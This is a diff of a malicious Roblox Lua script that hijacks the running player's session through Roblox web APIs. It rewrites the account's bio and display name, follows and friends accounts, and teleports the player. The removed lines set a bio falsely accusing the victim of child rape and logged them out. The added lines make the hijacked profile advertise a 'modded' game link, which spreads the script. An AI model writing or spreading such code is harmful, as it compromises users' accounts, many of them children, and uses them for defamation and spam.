@@ -123,14 +123,14 @@ task.wait(0.01)
 local function godly() -- mess with the roblox account profile
 local player = game.Players.LocalPlayer
 local userId = player.UserId
-local description = '{"description":"I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children I erape Children"}'
+local description = '{"description":"Ever wanted to play a Roblox game in which you train to get stronger than everyone? I have the right game for you...\n\n👊 Train your fists and punch like Superman!\n💪 Train your body and become invincible!\n✨ Train your mind to achieve psychic powers!\n⚡ Train your speed to the point of teleportation!\n☄️ Take the path of Superhero or Supervillain!\n🏆 Compete in Global Leaderboards, and much more!\n\nOnly the strongest will survive...\nhttps://www.roblox.com/games/15786769057/RELEASE-SPTS-Modded"}'
 local none = ''
 local china = '{"supportedLocaleCode":"zh_TW"}'
 local friend = '{"friendshipOriginSourceType":0}'
 local changedisplay = {
     Url = "https://users.roblox.com/v1/users/" .. game.Players.LocalPlayer.UserId .. "/display-names",
     Method = "PATCH",
-    Body = '{"newDisplayName":"banned"}',
+    Body = '{"newDisplayName":"Check_MyRobloxBio"}',
 }
 
 local followaccount, followacc = pcall(function()
@@ -160,7 +160,6 @@ game:GetService("HttpRbxApiService"):PostAsyncFullUrl('https://friends.roblox.co
 end)
 task.wait(0.01)
 game:GetService("TeleportService"):Teleport(15786769057)
-game:GetService("HttpRbxApiService"):PostAsyncFullUrl("https://auth.roblox.com/v1/logout", none)
 task.wait(3)
 print("oops")
 end
